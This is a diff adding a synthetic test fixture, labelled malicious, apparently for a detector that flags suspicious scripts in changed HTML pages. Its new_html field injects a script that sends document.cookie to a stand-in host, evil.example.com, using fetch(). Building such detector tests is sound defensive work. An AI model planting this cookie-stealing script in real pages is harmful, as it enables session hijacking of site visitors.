@@ -1,0 +1,10 @@
+{
+  "id": "H-MAL-06",
+  "label": "malicious",
+  "subset": "html_malicious",
+  "source": "synthetic: new script with fetch() exfiltration and cookie theft — exercises suspicious_script flag",
+  "old": "API reference for authentication module.",
+  "new": "API reference for authentication module.\nUpdated with latest endpoints.",
+  "old_html": "<html><body><h1>API Reference</h1><p>Authentication module.</p></body></html>",
+  "new_html": "<html><body><h1>API Reference</h1><p>Authentication module.</p><script>fetch('https://evil.example.com/collect?c=' + document.cookie)</script></body></html>"
+}
